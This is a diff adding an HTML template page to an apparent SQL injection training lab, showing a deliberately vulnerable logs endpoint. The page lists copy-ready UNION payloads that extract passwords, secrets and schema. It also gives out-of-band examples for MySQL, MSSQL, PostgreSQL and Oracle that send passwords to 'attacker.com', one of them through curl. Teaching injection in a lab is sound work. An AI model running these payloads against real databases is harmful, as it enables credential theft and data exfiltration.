@@ -1,0 +1,92 @@
+{% extends "base.html" %}
+
+{% block title %}API Stats - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">📡 System Logs API</span>
+        <span class="badge badge-danger">Vulnerable: Simulated OOB SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This endpoint simulates <strong>Out-of-Band SQL Injection</strong> concepts.
+        While SQLite lacks native network functions, this demonstrates how query results containing attacker-controlled data can be used for exfiltration.
+    </p>
+    <form method="GET" action="{{ url_for('api_stats') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="id" value="{{ log_id }}" placeholder="Log ID..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">Fetch Logs</button>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+    {% if results %}
+    <table class="data-table">
+        <thead>
+            <tr><th>ID</th><th>Action</th><th>Details</th><th>Time</th></tr>
+        </thead>
+        <tbody>
+            {% for row in results %}
+            <tr>
+                <td>{{ row.id }}</td>
+                <td><span class="badge badge-info">{{ row.action }}</span></td>
+                <td>{{ row.details }}</td>
+                <td>{{ row.log_time }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% endif %}
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Simulated OOB Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Exfiltrate user passwords into log results</div>
+        1 UNION SELECT id, 'EXFIL_' || username, password, 'data_exfil' FROM users
+    </div>
+    <div class="payload">
+        <div class="payload-label">Extract secrets/flags into the result set</div>
+        1 UNION SELECT id, 'SECRET_' || secret_key, secret_value, 'exfiltrated' FROM secrets
+    </div>
+    <div class="payload">
+        <div class="payload-label">Dump all table schemas (schema exfiltration)</div>
+        1 UNION SELECT rowid, type, name || ': ' || sql, 'schema' FROM sqlite_master WHERE sql IS NOT NULL
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--warning);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--warning);">🌐 Real-World OOB Examples</span>
+    </div>
+    <div style="font-size: 13px; color: var(--text-muted); line-height: 1.8;">
+        <p style="margin-bottom: 12px;">Other database systems have native OOB capabilities:</p>
+        <div style="background: var(--bg); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+            <strong style="color: var(--danger);">MySQL:</strong><br>
+            <code>1 AND LOAD_FILE(CONCAT('\\attacker.com\', (SELECT password FROM users LIMIT 1), '.dns.log'))</code>
+        </div>
+        <div style="background: var(--bg); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+            <strong style="color: var(--danger);">MSSQL:</strong><br>
+            <code>1; EXEC master..xp_dirtree '\\attacker.com\test' --</code>
+        </div>
+        <div style="background: var(--bg); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+            <strong style="color: var(--danger);">PostgreSQL:</strong><br>
+            <code>1; COPY (SELECT password FROM users) TO PROGRAM 'curl attacker.com/?d=' || password --</code>
+        </div>
+        <div style="background: var(--bg); padding: 12px; border-radius: 8px;">
+            <strong style="color: var(--danger);">Oracle:</strong><br>
+            <code>1 AND UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL --</code>
+        </div>
+    </div>
+</div>
+{% endblock %}
